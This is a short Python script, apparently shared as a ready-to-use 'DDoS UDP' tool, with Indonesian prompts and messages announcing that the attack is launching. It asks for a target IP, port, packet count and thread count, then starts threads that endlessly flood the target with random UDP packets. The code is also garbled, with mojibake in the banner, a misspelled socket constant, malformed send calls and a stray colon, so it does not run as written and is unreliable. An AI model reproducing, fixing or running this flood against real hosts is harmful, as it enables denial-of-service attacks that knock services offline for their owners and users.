#GitdownDDoS-UDP
#CodeByGitdown
import socket
import random
import threading
import os,sys

print("
__________________________

πΈπ¦π₯ππ π£      β’  πΎππ₯π»π π¨ππππ
ππ π¦ππ¦ππ  β’  πΎππ₯π»π π¨ππππ

  Tools DDoS UDP Server
__________________________")

ip_GitDown404 = str(input("Ip Target : "))
port_GitDown404 = int(input("Port Target : "))
paket_GitDown404 = int(input("Paket Dari GitDown404 : "))
threads_GitDown404 = int(input("Thread Dari GitDown404 : "))
os.system("clear")

def GitDown404():
    GitDown= random._urandom(1024)#ubah angka urandom= damage
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
            s.connect((ip_GitDown404,port_GitDown404))
            s.sendto(GitDown)
            for x in range(paket_GitDown404):
                s.sendto(GitDown):
            print("[β’] Serangan DDoS Dari GitDown404 Sedang Meluncur.")
        except:
            print("[β’] Serangan DDoS Dari GitDown404 Sedang Meluncur")

for y in range(threads_GitDown404):
    th = threading.Thread(target=GitDown404)
    th.start()
